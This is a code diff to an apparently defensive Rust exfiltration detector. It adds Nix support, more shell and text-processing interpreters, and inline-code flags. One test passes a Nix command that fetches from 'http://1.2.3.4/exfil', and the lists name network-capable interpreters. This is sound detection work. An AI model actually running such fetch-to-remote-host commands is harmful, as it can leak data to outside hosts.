@@ -9,6 +9,7 @@ mod julia;
 mod kotlin;
 mod lang;
 mod lua;
+mod nix;
 mod perl;
 mod php;
 mod powershell;
@@ -25,6 +26,7 @@ use self::javascript::JavaScriptDetector;
 use self::julia::JuliaDetector;
 use self::kotlin::KotlinDetector;
 use self::lua::LuaDetector;
+use self::nix::NixDetector;
 use self::perl::PerlDetector;
 use self::php::PhpDetector;
 use self::powershell::PowerShellDetector;
@@ -114,13 +116,28 @@ const INTERPRETERS: &[&str] = &[
     "jshell",
     // macOS
     "osascript",
+    // Nix
+    "nix",
+    "nix-shell",
+    "nix-build",
+    "nix-instantiate",
+    // Text processing
+    "awk",
+    "gawk",
+    "mawk",
+    "nawk",
+    "sed",
+    "gsed",
 ];
 
 const SHELL_INTERPRETERS: &[&str] = &[
-    "bash", "sh", "zsh", "dash", "ksh", "fish", "ash", "csh", "tcsh",
+    "bash", "sh", "zsh", "dash", "ksh", "mksh", "oksh", "pdksh", "fish", "ash", "csh", "tcsh",
+    "yash", "rc", "es",
 ];
 
-const INLINE_CODE_FLAGS: &[&str] = &["-c", "-e", "-r", "--eval", "eval", "-script"];
+const INLINE_CODE_FLAGS: &[&str] = &[
+    "-c", "-e", "-r", "--eval", "eval", "-script", "--expr", "--run",
+];
 
 const CODE_NETWORK_INDICATORS: &[&str] = &[
     // Python
@@ -715,7 +732,11 @@ fn try_ast_detection(code: &str, cmd_name: &str) -> Option<String> {
         "groovy" => detect_exfil_in_code(code, &GroovyDetector, cmd_name),
         "scala" => detect_exfil_in_code(code, &ScalaDetector, cmd_name),
         "kotlin" | "kotlinc" => detect_exfil_in_code(code, &KotlinDetector, cmd_name),
-        // No AST support: jshell, tclsh, wish, osascript - fall through to keyword matching
+        // Nix
+        "nix" | "nix-shell" | "nix-build" | "nix-instantiate" => {
+            detect_exfil_in_code(code, &NixDetector, cmd_name)
+        }
+        // No AST support: jshell, tclsh, wish, osascript, awk, sed - fall through to keyword matching
         _ => None,
     }
 }
@@ -1344,5 +1365,27 @@ mod tests {
         // busybox wget (not via sh -c) — just the wget command
         let result = detect_exfiltration("busybox wget http://example.com/file");
         assert!(result.is_none(), "busybox wget without -c should pass");
+    }
+
+    // === Nix tests ===
+
+    #[test]
+    fn nix_eval_fetchurl_ip() {
+        // Simpler test: fetchurl to IP address
+        let result =
+            detect_exfiltration(r#"nix eval --expr 'builtins.fetchurl "http://1.2.3.4/exfil"'"#);
+        assert!(result.is_some(), "nix fetchurl to IP should detect");
+    }
+
+    #[test]
+    fn nix_eval_safe() {
+        let result = detect_exfiltration(r#"nix eval --expr "1 + 1""#);
+        assert!(result.is_none(), "nix eval simple expr should pass");
+    }
+
+    #[test]
+    fn nix_instantiate_safe() {
+        let result = detect_exfiltration(r#"nix-instantiate --eval --expr "let x = 1; in x + 1""#);
+        assert!(result.is_none(), "nix-instantiate simple expr should pass");
     }
 }
